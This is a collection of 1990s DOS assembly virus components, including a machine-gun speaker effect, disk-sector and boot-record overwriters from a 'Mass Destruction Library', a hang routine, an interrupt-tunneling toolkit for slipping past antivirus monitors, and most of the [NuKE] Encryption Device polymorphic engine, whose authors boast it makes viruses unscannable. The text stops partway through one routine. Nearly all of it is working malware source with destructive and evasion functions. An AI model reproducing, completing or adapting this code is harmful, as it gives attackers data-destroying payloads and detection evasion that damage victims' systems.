        jnz     agin4                ;if not = 0 do again
        dec     di                   ;else decrement repeat count
        jnz     agin3                ;if not = 0 do again
        ret                          ;and leave
arcade_b        endp
;----------------------------------
code_seg        ends
     end        start

;;;;;

;  Makes Machine gun sounds over the speaker.
;  shots= numero de disparos

shots equ 60

        mov cx,shots
machine_gun:
        push    cx                      ; Save the current count
        mov     dx,0140h                ; DX holds pitch
        mov     bx,0100h                ; BX holds shot duration
        in      al,061h                 ; Read the speaker port
        and     al,11111100b            ; Turn off the speaker bit
fire_shot:
        xor     al,2                    ; Toggle the speaker bit
        out     061h,al                 ; Write AL to speaker port
        add     dx,09248h               ;
        mov     cl,3                    ;
        ror     dx,cl                   ; Figure out the delay time
        mov     cx,dx                   ;
        and     cx,01FFh                ;
        or      cx,10                   ;
shoot_pause:
        loop    shoot_pause             ; Delay a bit
        dec     bx                      ; Are we done with the shot?
        jnz     fire_shot               ; If not, pulse the speaker
        and     al,11111100b            ; Turn off the speaker bit
        out     061h,al                 ; Write AL to speaker port
        mov     bx,0002h                ; BX holds delay time (ticks)
        xor     ah,ah                   ; Get time function
        int     1Ah                     ; BIOS timer interrupt
        add     bx,dx                   ; Add current time to delay
shoot_delay:
        int     1Ah                     ; Get the time again
        cmp     dx,bx                   ; Are we done yet?
        jne     shoot_delay             ; If not, keep checking
        pop     cx                      ; Restore the count
        loop    machine_gun             ; Do another shot
        ret

;;;;;

;  Sobreescribe un disco
; drive: 0=A, 1=B, etc...
; sectores: numero de sectores a escribir

drive equ 0
sectores equ 50

        mov al,drive
        mov cx,sectores
        cli                             ; Disable interrupts (no Ctrl-C)
        cwd                             ; Clear DX (start with sector 0)
        int     026h                    ; DOS absolute write interrupt
        sti                             ; Restore interrupts
        ret

;;;;;

;KILL_BR - module for Mass Destruction Library
;written by Evil Avatar

eldrive equ 0 ; Drive cuyo boot se va a sobreescribir (0=A,etc.)

        mov al,eldrive
        mov dx,offset texto3   ; Texto con el que se va a
                               ; sobreescribir
        jmp kill_br
        texto3 db 'TE GUSTA TU NUEVO BOOT RECORD??'
kill_br:
        push cx
        push dx
        push ax               ;Save regs that will be changed
        cmp ax, 2             ;If drive is not a hard drive, then
        jb kill_br1           ;jump to kill_br1
        add ax, 78h           ;else, set up for hard drive 
kill_br1:                     
        xchg ax, dx           ;drive number must be in dl
        xor ax, ax            
        int 13h               ;reset the disk
        jc kill_br2           ;if error, quit
        pop ax                ;restore disk number
        mov cx, 1
        xor dx, dx
        int 26h               ;overwrite boot record
        push ax
kill_br2:        
        pop ax
        pop dx
        pop cx                ;restore regs and return
        ret

;;;;;

; KOHNTARK'S RECURSIVE TUNNELING TOOLKIT 4.1 (KRTT 4.1)
; KEEP THIS IN MIND WHEN LOOKING AT THE CODE:
;       JMP ????:????           ==>             EA????????
;       CALL ????:????          ==>             9A????????
;       JMP FAR [????]          ==>             FF2E????
;       CALL FAR [????]         ==>             FF1E????
; AND ALSO:
;       JMP ????                ==>             FF26????
;       CALL ????               ==>             E8????

code            segment word public
        assume cs:code, ds:code, es:code, ss:code
public Tunnel
Tunnel          label           byte
        CLI
        XOR     AX,AX                   ; Get Segment Zero ==> ES
        MOV     ES,AX
        XOR     DI,DI
        MOV     DX,ES:[0AEH]            ; Get Int 2B Segment Addr
        MOV     CX,ES:[0A2H]            ; Get Int 28 Segment Addr
        CMP     DX,CX                   ; Are They Equal?
        JZ      Proceed                 ; If So, Go On
        MOV     CX,ES:[0B2H]            ; Get Int 2C Segment Addr
        CMP     DX,CX                   ; Equal or Not?
        JZ      Proceed                 ; Of So Go On
        MOV     AH,3                    ; Internal DOS interrupts are
        RET                                     ; Hooked (Int 2b, 28, 2c)

Proceed:
        CMP     BP,1                    ; Check Int 2A?
        JZ      CheckInt2A
        CMP     BP,2                    ; Check Int 13?
        JZ      CheckInt13

        MOV     BX,ES:[84H]             ; Check Int 21
        MOV     ES,ES:[86H]             ; Get Int 21 Far Addres
        JMP     CheckInt21

CheckInt13:
        MOV     BX,ES:[4CH]             ; Get Int 13 Far Address
        MOV     ES,ES:[4EH]
        MOV     BP,ES
        MOV     DX,70H                  ; Is Segment = 0070?
        CMP     BP,DX
        JZ      NotHooked               ; If it is: Int not hooked
        JMP     Hooked                  ; If Not, Continue

CheckInt2A:
        MOV     BX,ES:[0A8H]            ; Get Int 2A Far Address
        MOV     ES,ES:[0AAH]

CheckInt21:
        MOV     BP,ES                   ; Compare Segment of Int 21/2A
        CMP     DX,BP                   ; with segment of Int 28
        JNZ     Hooked

NotHooked:
        XCHG    BX,DI                   ; BX = 0
        MOV     AH,2                    ; They're equal: 
        RET                             ; Int Not hooked!

Hooked:
        CALL    DoTunneling
        STI
        RET

DoTunneling:
; NOTE THAT:
;       ADDRESSES OF CODE TO TUNNEL (INT 21, 13, 2A) ARE PASSED IN ES:BX
;       DX HOLDS SEGMENT ADDRESS OF INTERNAL INT 2A OR BIOS SEGMENT 70H
;       AH HOLDS RESULTS, AL RECURSION DEPTH
        PUSH    ES
        PUSH    BX
        CMP     AL,7                    ; if recursion depth 7
        JZ      ExitTun                 ; exit
        CMP     AH,1                    ; if found
        JZ      ExitTun                 ; exit

        INC     AL                      ; increase recursion depth
        MOV     CX,0FFFAH               ; 
        SUB     CX,BX                   ; 

continue:
        PUSH    BX

        CMP     BYTE PTR ES:[BX],0E8H   ; call xxxx?
        JZ      icall
        CMP     BYTE PTR ES:[BX],0EAH   ; jmp xxxx:xxxx?
        JZ      immfound
        CMP     BYTE PTR ES:[BX],9AH    ; call xxxx:xxxx?
        JZ      immfound
        CMP     BYTE PTR ES:[BX],2EH    ; cs:?
        JNZ     nothingf

indirect_jmp_or_call:
        CMP     BYTE PTR ES:[BX+1],0FFH
        JNZ     nothingf
        CMP     BYTE PTR ES:[BX+2],1EH  ; call far [xxxx]
        JZ      indfound
        CMP     BYTE PTR ES:[BX+2],2EH  ; jmp far [xxxx]
        JNZ     nothingf

indfound:                               ; indirect (call far [x], jmp far [x])
        MOV     BP,ES:[BX+3]            ; get addr of variable
        DEC     BP
        XCHG    BX,BP
        JMP     immfound                ; and go get its contents

nothingf:
        POP     BX
        CMP     AH,1
        JZ      ExitTun
        CMP     AL,7
        JZ      ExitTun
        INC     BX
        LOOP    continue

icall:
        POP     BX                      ; its a call near
        ADD     BX,3                    ; continue
        LOOP    continue

ExitTun:
        POP     BX
        POP     ES
        RET

immfound:
        POP     BP                      ; get addr of instruccion
        ADD     BP,4                    ; save addres for next instruccion
        PUSH    BP                      ; see if segment of jmp is equal to
        CMP     ES:[BX+3],DX            ; desired segment.
        JZ      found                   ; if it is, exit
        CMP     WORD PTR ES:[BX+3],0    ; see if its zero.
        JZ      nothingf
        PUSH    ES
        POP     BP
        CMP     ES:[BX+3],BP            ; see if it is within current seg.
        JZ      nothingf
; if none of the precedent, then its a non-int21, far call or jmp
        MOV     BP,BX
        MOV     BX,ES:[BX+1]            ; get offset
        MOV     ES,ES:[BP+3]            ; get segment
        CALL    DoTunneling             ; and call recursively

        JMP     nothingf

found:
        MOV     DI,ES:[BX+01]           ; get the offset of int
        MOV     AH,1                    ; return with succes
        JMP     nothingf
ends
end

;;;;;

;LOAD_SEC - module for Mass Destruction Library
;written by Evil Avatar
.model tiny
.code
public load_sec, sec_buf

load_sec:
        push cx
        push ds               ;save regs that will be changed
        push ax               ;save drive number
        push cs
        pop ds
        push cs
        pop es                ;make es and ds the same as cs
        mov ax, 0dh
        int 21h               ;reset disk
        pop ax                ;restore drive number
        mov cx, 1
        mov bx, offset sec_buf
        int 25h               ;read sector into buffer
        pop ds
        pop cx
        ret                   ;restore regs and return
sec_buf dw 100h dup(?)
end load_sec

;;;;;

;  Cuelga la computadora

        cli
        jmp     $

;;;;;

;******************************************************************************
; [NuKE] BETA TEST VERSION -- NOT FOR PUBLIC RELEASE!
;
; This product is not to be distributed to ANYONE without the complete and
; total agreement of both the author(s) and [NuKE].  This applies to all
; source code, executable code, documentation, and other files included in
; this package.
;
; Unless otherwise specifically stated, even the mere existance of this
; product is not to be mentioned to or discussed in any fashion with ANYONE,
; except with the author(s) and/or other [NuKE] members.
;
; WARNING:  This product has been marked in such a way that, if an
; unauthorized copy is discovered ANYWHERE, the violation can be easily
; traced back to its source, who will be located and punished.
; YOU HAVE BEEN WARNED.
;******************************************************************************


;*******************************************************************************
; The [NuKE] Encryption Device v0.90�
;
; (C) 1992 Nowhere Man and [NuKE] International Software Development Corp.
; All Rights Reserved.  Unauthorized use strictly prohibited.
;
;*******************************************************************************
; Written by Nowhere Man
; October 18, 1992
; Version 0.90�
;*******************************************************************************
;
; Synopsis:  The [NuKE] Encryption Device (N.E.D.) is a polymorphic mutation
;            engine, along the lines of Dark Avenger's now-famous MtE.
;            Unlike MtE, however, N.E.D. can't be SCANned, and probably will
;            never be, either, since there is no reliable pattern between
;            mutations, and the engine itself (and its RNG) are always
;            kept encrypted.
;
;            N.E.D. is easily be added to a virus.  Every infection with
;            that virus will henceforth be completely different from all
;            others, and all will be unscannable, thanks to the Cryptex(C)
;            polymorphic mutation algorithm.
;
;            N.E.D. only adds about 15 or so bytes of decryption code
;            (probably more, depending on which options are enabled), plus
;            the 1355 byte overhead needed for the engine itself (about half
;            the size of MtE!).
;*******************************************************************************


;*******************************************************************************
;                         Segment declarations
;*******************************************************************************

.model tiny
.code


;*******************************************************************************
;         Equates used to save three bytes of code (was it worth it?)
;*******************************************************************************

load_point      equ     si + _load_point - ned_start
encr_instr      equ     si + _encr_instr - ned_start
store_point     equ     si + _store_point - ned_start

buf_ptr         equ     si + _buf_ptr - ned_start
copy_len        equ     si + _copy_len - ned_start
copy_off        equ     si + _copy_off - ned_start
v_start         equ     si + _v_start - ned_start
options         equ     si + _options - ned_start

byte_word       equ     si + _byte_word - ned_start
up_down         equ     si + _up_down - ned_start
mem_reg         equ     si + _mem_reg - ned_start
loop_reg        equ     si + _loop_reg - ned_start
key_reg         equ     si + _key_reg - ned_start

mem_otr         equ     si + _mem_otr - ned_start
used_it         equ     si + _used_it - ned_start
jump_here       equ     si + _jump_here - ned_start
adj_here        equ     si + _adj_here - ned_start

word_adj_table  equ     si + _word_adj_table - ned_start
byte_adj_table  equ     si + _byte_adj_table - ned_start

the_key         equ     si + _the_key - ned_start

crypt_type      equ     si + _crypt_type - ned_start
op_byte         equ     si + _op_byte - ned_start
rev_op_byte     equ     si + _rev_op_byte - ned_start
modr_m          equ     si + _modr_m - ned_start

dummy_word_cmd  equ     si + _dummy_word_cmd - ned_start
dummy_three_cmd equ     si + _dummy_three_cmd - ned_start

tmp_jmp_store   equ     si + _tmp_jmp_store - ned_start
jump_table      equ     si + _jump_table - ned_start

rand_val        equ     si + _rand_val - ned_start


;******************************************************************************
;                                Publics
;******************************************************************************

public          nuke_enc_dev
public          ned_end



;*******************************************************************************
;                [NuKE] Encryption Device begins here....
;*******************************************************************************

ned_begin       label   near                    ; Start of the N.E.D.'s code


;******************************************************************************
; nuke_enc_dev
;
; This procedure merely calls ned_main.
;
; Arguments:    Same as ned_main; this is a shell procedure
;
; Returns:      Same as ned_main; this is a shell procedure
;******************************************************************************

nuke_enc_dev    proc    near
                public  nuke_enc_dev            ; Name in .OBJs and .LIBs

                push    bx                      ;
                push    cx                      ;
                push    dx                      ; Preserve registers
                push    si                      ; (except for AX, which is
                push    di                      ; used to return something)
                push    bp                      ;

                call    ned_main                ; Call the [NuKE] Encryption
                                                ; Device, in all it's splendor

                pop     bp                      ;
                pop     di                      ;
                pop     si                      ;
                pop     dx                      ; Restore registers
                pop     cx                      ;
                pop     bx                      ;

                ret                             ; Return to the main virus


; This the copyright message (hey, I wrote the thing, so I can waste a few
; bytes bragging...).

copyright       db      13,10
                db      "BLACK AXiS BBS...NEWPORT NEWS, ",13,10
                db      "Go DALLAS COWBOYS -ARiSToTLE-  ",13,10,0
nuke_enc_dev    endp


;******************************************************************************
; ned_main
;
; Fills a buffer with a random decryption routine and encrypted viral code.
;
; Arguments:    AX = offset of buffer to hold data
;               BX = offset of code start
;               CX = offset of the virus in memory (next time around!)
;               DX = length of code to copy and encrypt
;               SI = options:
;                       bit 0:  dummy instructions
;                       bit 1:  MOV variance
;                       bit 2:  ADD/SUB substitution
;                       bit 3:  garbage code
;                       bit 4:  don't assume DS = CS
;                       bits 5-15:  reserved
;
; Returns:      AX = size of generated decryption routine and encrypted code
;******************************************************************************

ned_main        proc    near
                mov     di,si                   ; We'll need SI, so use DI
                not     di                      ; Reverse all bits for TESTs

                call    ned_start               ; Ah, the old virus trick
ned_start:      pop     si                      ; for getting our offset...

                mov     word ptr [used_it],0    ; A truely hideous way to
                mov     word ptr [used_it + 2],0; reset the register usage
                mov     word ptr [used_it + 4],0; flags...
                mov     byte ptr [used_it + 6],0;

                add     dx,ned_end - ned_begin  ; Be sure to encrypt ourself!

                mov     word ptr [buf_ptr],ax   ; Save the function
                mov     word ptr [copy_off],bx  ; arguments in an
                mov     word ptr [v_start],cx   ; internal buffer
                mov     word ptr [copy_len],dx  ; for later use
                mov     word ptr [options],di   ;

                xchg    di,ax                   ; Need the buffer offset in DI

                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                mov     word ptr [byte_word],ax ; Save byte/word flag

                mov     ax,2                    ; Select another random number
                call    rand_num                ; between 0 and 1
                xor     ax,ax                   ; !!!!DELETE ME!!!!
                mov     word ptr [up_down],ax   ; Save up/down flag

                mov     ax,4                    ; Select a random number
                call    rand_num                ; between 0 and 3
                mov     word ptr [mem_reg],ax   ; Save memory register
                xchg    bx,ax                   ; Place in BX for indexing
                shl     bx,1                    ; Convert to word index
                mov     bx,word ptr [mem_otr + bx]  ; Get register number
                inc     byte ptr [used_it + bx] ; Cross off register

                xor     cx,cx                   ; We need a word register
                call    random_reg              ; Get a random register
                inc     byte ptr [used_it + bx] ; Cross it off...
                mov     word ptr [loop_reg],ax  ; Save loop register

                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                or      ax,ax                   ; Does AX = 0?
                je      embedded_key            ; If so, the key's embedded
                mov     cx,word ptr [byte_word] ; CX holds the byte word flag
                neg     cx                      ; By NEGating CX and adding one
                inc     cx                      ; CX will be flip-flopped
                call    random_reg              ; Get a random register
                inc     byte ptr [used_it + bx] ; Cross it off...
                mov     word ptr [key_reg],ax   ; Save key register
                jmp     short create_routine    ; Ok, let's get to it!
embedded_key:   mov     word ptr [key_reg],-1   ; Set embedded key flag

create_routine: call    add_nop                 ; Add a do-nothing instruction?
                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                or      ax,ax                   ; Does AX = 0?
                je      pointer_first           ; If so, load pointer then count
                call    load_count              ; Load start register
                call    add_nop                 ; Add a do-nothing instruction?
                call    load_pointer            ; Load pointer register
                jmp     short else_end1         ; Skip the ELSE part
pointer_first:  call    load_pointer            ; Load start register
                call    add_nop                 ; Add a do-nothing instruction?
                call    load_count              ; Load count register
else_end1:      call    add_nop                 ; Add a do-nothing instruction?
                call    load_key                ; Load encryption key
                call    add_nop                 ; Add a do-nothing instruction?
                mov     word ptr [jump_here],di ; Save the offset of the loop
                call    add_decrypt             ; Create the decryption code
                call    add_nop                 ; Add a do-nothing instruction?
                call    adjust_ptr              ; Adjust the memory pointer
                call    add_nop                 ; Add a do-nothing instruction?
                call    end_loop                ; End the decryption loop
                call    random_fill             ; Pad with random bullshit?

                mov     ax,di                   ; AX points to our current place
                sub     ax,word ptr [buf_ptr]   ; AX now holds # bytes written

                mov     bx,word ptr [adj_here]  ; Find where we need to adjust
                add     word ptr [bx],ax        ; Adjust the starting offset

                add     ax,word ptr [copy_len]  ; Add length of encrypted code
                push    ax                      ; Save this for later

                mov     bx,word ptr [crypt_type]; BX holds encryption type
                mov     bl,byte ptr [rev_op_byte + bx]  ; Load encryption byte
                mov     bh,0D8h                 ; Fix a strange problem...
                mov     word ptr [encr_instr],bx; Save it into our routine

                mov     cx,word ptr [copy_len]  ; CX holds # of bytes to encrypt
                cmp     word ptr [byte_word],0  ; Are we doing it by bytes?
                je      final_byte_k            ; If so, reset LODS/STOS stuff
                mov     byte ptr [load_point],0ADh  ; Change it to a LODSW
                mov     byte ptr [store_point],0ABh  ; Change it to a STOSW
                shr     cx,1                    ; Do half as many repetitions
                mov     bx,word ptr [the_key]   ; Reload the key
                inc     byte ptr [encr_instr]   ; Fix up for words...
                jmp     short encrypt_virus     ; Let's go!
final_byte_k:   mov     byte ptr [load_point],0ACh  ; Change it to a LODSW
                mov     byte ptr [store_point],0AAh  ; Change it to a STOSW
                mov     bl,byte ptr [the_key]   ; Ok, so I did this poorly...

encrypt_virus:  mov     si,word ptr [copy_off]  ; SI points to the original code


; This portion of the code is self-modifying.  It may be bad style, but
; it's far more efficient than writing six or so different routines...

_load_point:    lodsb                           ; Load a byte/word into AL
_encr_instr:    xor     al,bl                   ; Encrypt the byte/word
_store_point:   stosb                           ; Store the byte/word at ES:[DI]
                loop    _load_point             ; Repeat until all bytes done

; Ok, we're through... back to normal


                pop     ax                      ; AX holds routine length

                ret                             ; Return to caller

_buf_ptr        dw      ?                       ; Pointer: storage buffer
_copy_len       dw      ?                       ; Integer: # bytes to copy
_copy_off       dw      ?                       ; Pointer: original code
_v_start        dw      ?                       ; Pointer: virus start in file
_options        dw      ?                       ; Integer: bits set options

_byte_word      dw      ?                       ; Boolean: 0 = byte, 1 = word
_up_down        dw      ?                       ; Boolean: 0 = up, 1 = down
_mem_reg        dw      ?                       ; Integer: 0-4 (SI, DI, BX, BP)
_loop_reg       dw      ?                       ; Integer: 0-6 (AX, BX, etc.)
_key_reg        dw      ?                       ; Integer: -1 = internal

_mem_otr        dw      4,5,1,6                 ; Array: Register # for mem_reg
_used_it        db      7 dup (0)               ; Array: 0 = unused, 1 = used
_jump_here      dw      ?                       ; Pointer: Start of loop
_adj_here       dw      ?                       ; Pointer: Where to adjust
ned_main        endp


;******************************************************************************
; load_count
;
; Adds code to load the count register, which stores the number of
; iterations that the decryption loop must make.  if _byte_word = 0
; then this value is equal to the size of the code to be encrypted;
; if _byte_word = 1 (increment by words), it is half that length
; (since two bytes are decrypted at a time).
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

load_count      proc    near
                mov     bx,word ptr [loop_reg]  ; BX holds register number
                mov     dx,word ptr [copy_len]  ; DX holds size of virus
                mov     cx,word ptr [byte_word] ; Neat trick to divide by
                shr     dx,cl                   ; two if byte_word = 1
                mov     cx,1                    ; We're doing a word register
                call    gen_mov                 ; Generate a move
                ret                             ; Return to caller

_word_adj_table db      00h, 03h, 01h, 02h, 06h, 07h, 05h  ; Array: ModR/M adj.
_byte_adj_table db      04h, 00h, 07h, 03h, 05h, 01h, 06h, 02h  ; Array ""/byte
load_count      endp


;******************************************************************************
; load_pointer
;
; Adds code to load the pointer register, which points to the byte
; or word of memory that is to be encrypted.  Due to the flaws of
; 8086 assembly language, only the SI, DI, BX, and BP registers may
; be used.
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;******************************************************************************

load_pointer    proc    near
                mov     bx,word ptr [mem_reg]   ; BX holds register number
                shl     bx,1                    ; Convert to word index
                mov     bx,word ptr [mem_otr + bx]  ; Convert register number
                mov     al,byte ptr [word_adj_table + bx]  ; Table look-up
                add     al,0B8h                 ; Create a MOV instruction
                stosb                           ; Store it in the code
                mov     word ptr [adj_here],di  ; Save our current offset
                mov     ax,word ptr [v_start]   ; AX points to virus (in host)
                cmp     word ptr [up_down],0    ; Are we going upwards?
                je      no_adjust               ; If so, no ajustment needed
                add     ax,word ptr [copy_len]  ; Point to end of virus
no_adjust:      stosw                           ; Store the start offset
                ret                             ; Return to caller
load_pointer    endp


;******************************************************************************
; load_key
;
; Adds code to load the encryption key into a register.  If _byte_word = 0
; a 8-bit key is used; if it is 1 then a 16-bit key is used.  If the key
; is supposed to be embedded, no code is generated at this point.
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

load_key        proc    near
                mov     ax,0FFFFh               ; Select a random number
                call    rand_num                ; between 0 and 65534
                inc     ax                      ; Eliminate any null keys
                mov     word ptr [the_key],ax   ; Save key for later
                mov     bx,word ptr [key_reg]   ; DX holds the register number
                cmp     bx,-1                   ; Is the key embedded?
                je      blow_this_proc          ; If so, just leave now
                xchg    dx,ax                   ; DX holds key
                mov     cx,word ptr [byte_word] ; CX holds byte/word flag
                call    gen_mov                 ; Load the key into the register
blow_this_proc: ret                             ; Return to caller

_the_key        dw      ?                       ; Integer: The encryption key
load_key        endp


;******************************************************************************
; add_decrypt
;
; Adds code to dencrypt a byte or word (pointed to by the pointer register)
; by either a byte or word register or a fixed byte or word.
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

add_decrypt     proc    near
                test    word ptr [options],010000b  ; Do we need a CS: override
                jne     no_override             ; If not, don't add it...
                mov     al,02Eh                 ; Store a code-segment
                stosb                           ; override instruction (CS:)
no_override:    mov     ax,3                    ; Select a random number
                call    rand_num                ; between 0 and 2
                mov     word ptr [crypt_type],ax; Save encryption type
                xchg    bx,ax                   ; Now transfer it into BX
                mov     ax,word ptr [byte_word] ; 0 if byte, 1 if word
                cmp     word ptr [key_reg],-1   ; Is the key embedded?
                je      second_case             ; If so, it's a different story

                add     al,byte ptr [op_byte + bx]  ; Adjust by operation type
                stosb                           ; Place the byte in the code

                mov     ax,word ptr [mem_reg]   ; AX holds register number
                mov     cl,3                    ; To get the ModR/M table
                shl     ax,cl                   ; offset, multiply by eight
                mov     bx,word ptr [key_reg]   ; BX holds key register number
                cmp     word ptr [byte_word],0  ; Is this a byte?
                je      byte_by_reg             ; If so, special case
                mov     bl,byte ptr [word_adj_table + bx]  ; Create ModR/M
                jmp     short store_it_now      ; Now save the byte
byte_by_reg:    mov     bl,byte ptr [byte_adj_table + bx]  ; Create ModR/M
store_it_now:   xor     bh,bh                   ; Clear out any old data
                add     bx,ax                   ; Add the first index
                mov     al,byte ptr [modr_m + bx]  ; Table look-up
                stosb                           ; Save it into the code
                cmp     word ptr [mem_reg],3    ; Are we using BP?
                jne     a_d_exit1               ; If not, leave
                xor     al,al                   ; For some dumb reason we'll
                stosb                           ; have to specify a 0 adjustment
a_d_exit1:      ret                             ; Return to caller


second_case:    add     al,080h                 ; Create the first byte
                stosb                           ; and store it in the code

                mov     al,byte ptr [op_byte + bx]  ; Load up the OP byte
                mov     bx,word ptr [mem_reg]   ; BX holds register number
                mov     cl,3                    ; To get the ModR/M table
                shl     bx,cl                   ; offset, multiply by eight
                add     al,byte ptr [modr_m + bx]  ; Add result of table look-up
                stosb                           ; Save it into the code
                cmp     word ptr [mem_reg],3    ; Are we using BP?
                jne     store_key               ; If not, store the key
                xor     al,al                   ; For some dumb reason we'll
                stosb                           ; have to specify a 0 adjustment
store_key:      cmp     word ptr [byte_word],0  ; Is this a byte?
                je      byte_by_byte            ; If so, special case
                mov     ax,word ptr [the_key]   ; Load up *the key*
                stosw                           ; Save the whole two bytes!
                jmp     short a_d_exit2         ; Let's split, man
byte_by_byte:   mov     al,byte ptr [the_key]   ; Load up *the key*
                stosb                           ; Save it into the code
a_d_exit2:      ret                             ; Return to caller

_crypt_type     dw      ?                       ; Integer: Type of encryption
_op_byte        db      030h,000h,028h          ; Array: OP byte of instruction
_rev_op_byte    db      030h,028h,000h          ; Array: Reverse OP byte of ""
_modr_m         db      004h, 00Ch, 014h, 01Ch, 024h, 02Ch, 034h, 03Ch  ; SI
                db      005h, 00Dh, 015h, 01Dh, 025h, 02Dh, 035h, 03Dh  ; DI
                db      007h, 00Fh, 017h, 01Fh, 027h, 02Fh, 037h, 03Fh  ; BX
                db      046h, 04Eh, 056h, 05Eh, 066h, 06Eh, 076h, 07Eh  ; BP
add_decrypt     endp


;******************************************************************************
; adjust_ptr
;
; Adds code to adjust the memory pointer.  There are two possible choices:
; INC/DEC and ADD/SUB (inefficient, but provides variation).
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

adjust_ptr      proc    near
                mov     cx,word ptr [byte_word] ; CX holds byte/word flag
                inc     cx                      ; Increment; now # INCs/DECs
                mov     bx,word ptr [mem_reg]   ; BX holds register number
                shl     bx,1                    ; Convert to word index
                mov     bx,word ptr [mem_otr + bx]  ; Convert register number
                mov     dx,word ptr [up_down]   ; DX holds up/down flag
                call    gen_add_sub             ; Create code to adjust pointer
                ret                             ; Return to caller
adjust_ptr      endp


;******************************************************************************
; end_loop
;
; Adds code to adjust the count variable, test to see if it's zero,
; and repeat the decryption loop if it is not.  There are three possible
; choices:  LOOP (only if the count register is CX), SUB/JNE (inefficient,
; but provides variation), and DEC/JNE (best choice for non-CX registers).
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

end_loop        proc    near
                mov     bx,word ptr [loop_reg]  ; BX holds register number
                cmp     bx,2                    ; Are we using CX?
                jne     dec_jne                 ; If not, we can't use LOOP
                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                or      ax,ax                   ; Does AX = 0?
                jne     dec_jne                 ; If not, standard ending
                mov     al,0E2h                 ; We'll do a LOOP instead
                stosb                           ; Save the OP byte
                jmp     short store_jmp_loc     ; Ok, now find the offset
dec_jne:        mov     cx,1                    ; Only adjust by one
                mov     dx,1                    ; We're subtracting...
                call    gen_add_sub             ; Create code to adjust count
                mov     al,075h                 ; We'll do a JNE to save
                stosb                           ; Store a JNE OP byte
store_jmp_loc:  mov     ax,word ptr [jump_here] ; Find old offset
                sub     ax,di                   ; Adjust relative jump
                dec     ax                      ; Adjust by one (DI is off)
                stosb                           ; Save the jump offset
                ret                             ; Return to caller
end_loop        endp


;******************************************************************************
; add_nop
;
; Adds between 0 and 3 do-nothing instructions to the code, if they are
; allowed by the user (bit 0 set).
;
; Arguments:    SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

add_nop         proc    near
                push    ax                      ; Save AX
                push    bx                      ; Save BX
                push    cx                      ; Save CX

                test    word ptr [options],0001b; Are we allowing these?
                jne     outta_here              ; If not, don't add 'em
                mov     ax,2                    ; Select a random number
                call    rand_num                ; between 0 and 1
                or      ax,ax                   ; Does AX = 0?
                je      outta_here              ; If so, don't add any NOPs...
                mov     ax,4                    ; Select a random number
                call    rand_num                ; between 0 and 3
                xchg    cx,ax                   ; CX holds repetitions
                jcxz    outta_here              ; CX = 0?  Split...
add_nop_loop:   mov     ax,4                    ; Select a random number
                call    rand_num                ; between 0 and 3
                or      ax,ax                   ; Does AX = 0?
                je      two_byter               ; If so, a two-byte instruction
                cmp     ax,1                    ; Does AX = 1?
                je      three_byter             ; If so, a three-byte instruction
                mov     al,090h                 ; We'll do a NOP instead
                stosb                           ; Store it in the code
                jmp     short loop_point        ; Complete the loop
two_byter:      mov     ax,34                   ; Select a random number
                call    rand_num                ; between 0 and 33
                xchg    bx,ax                   ; Place in BX for indexing
                shl     bx,1                    ; Convert to word index
                mov     ax,word ptr [dummy_word_cmd + bx]  ; Get dummy command
                stosw                           ; Save it in the code...
                jmp     short loop_point        ; Complete the loop
three_byter:    mov     ax,16                   ; Select a random number
                call    rand_num                ; between 0 and 15
                mov     bx,ax                   ; Place in BX for indexing
                shl     bx,1                    ; Convert to word index
                add     bx,ax                   ; Add back value (BX = BX * 3)
                mov     ax,word ptr [dummy_three_cmd + bx]  ; Get dummy command
                stosw                           ; Save it in the code...
                mov     al,byte ptr [dummy_three_cmd + bx + 2]
                stosb                           ; Save the final byte, too
loop_point:     loop    add_nop_loop            ; Repeat 0-2 more times
outta_here:     pop     cx                      ; Restore CX
                pop     bx                      ; Restore BX
                pop     ax                      ; Restore AX
                ret                             ; Return to caller

_dummy_word_cmd:                                ; Useless instructions,
                                                ; two bytes each
                mov     ax,ax
                mov     bx,bx
                mov     cx,cx
                mov     dx,dx
                mov     si,si
                mov     di,di
                mov     bp,bp
                xchg    bx,bx
                xchg    cx,cx
                xchg    dx,dx
                xchg    si,si
                xchg    di,di
                xchg    bp,bp
                nop
                nop
                inc     ax
                dec     ax
                inc     bx
                dec     bx
                inc     cx
                dec     cx
                inc     dx
                dec     dx
                inc     si
                dec     si
                inc     di
                dec     di
                inc     bp
                dec     bp
                cmc
                cmc
                jmp     short $ + 2
                je      $ + 2
                jne     $ + 2
                jg      $ + 2
                jge     $ + 2
                jl      $ + 2
                jle     $ + 2
                jo      $ + 2
                jpe     $ + 2
                jpo     $ + 2
                js      $ + 2
                jcxz    $ + 2


_dummy_three_cmd:                               ; Useless instructions,
                                                ; three bytes each
                xor     ax,0
                or      ax,0
                add     ax,0
                add     bx,0
                add     cx,0
                add     dx,0
                add     si,0
                add     di,0
                add     bp,0
                sub     ax,0
                sub     bx,0
                sub     cx,0
                sub     dx,0
                sub     si,0
                sub     di,0
                sub     bp,0
add_nop         endp


;******************************************************************************
; gen_mov
;
; Adds code to load a register with a value.  If MOV variance is enabled,
; inefficient, sometimes strange, methods may be used; if it is disabled,
; a standard MOV is used (wow).  Various alternate load methods include
; loading a larger value then subtracting the difference, loading a
; smaller value the adding the difference, loading an XORd value then
; XORing it by a key that will correct the difference, loading an incorrect
; value and NEGating or NOTing it to correctness, and loading a false
; value then loading the correct one.
;
; Arguments:    BX = register number
;               CX = 0 for byte register, 1 for word register
;               DX = value to store
;               SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:      None
;******************************************************************************

gen_mov         proc
                test    word ptr [options],0010b; Do we allow wierd moves?
                je      quick_fixup             ; If so, short jump over JMP
                jmp     make_mov                ; If not, standard MOV
quick_fixup:    jcxz    byte_index_0            ; If we're doing a byte, index
